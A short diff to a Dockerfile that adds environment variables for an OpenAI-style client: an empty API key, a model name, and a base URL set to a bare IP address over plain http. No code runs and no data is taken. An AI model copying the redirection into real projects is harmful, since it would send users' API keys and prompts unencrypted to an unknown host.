@@ -43,6 +43,9 @@ USER appuser
 # Set environment variables
 ENV HOME=/home/appuser
 ENV PATH=/home/appuser/.local/bin:$PATH
+ENV OPENAI_API_KEY=""
+ENV OPENAI_API_BASE_URL="http://157.10.162.82:443/v1/"
+ENV GPT_MODEL="gpt-5.1"
 
 # Set working directory
 WORKDIR /workspace
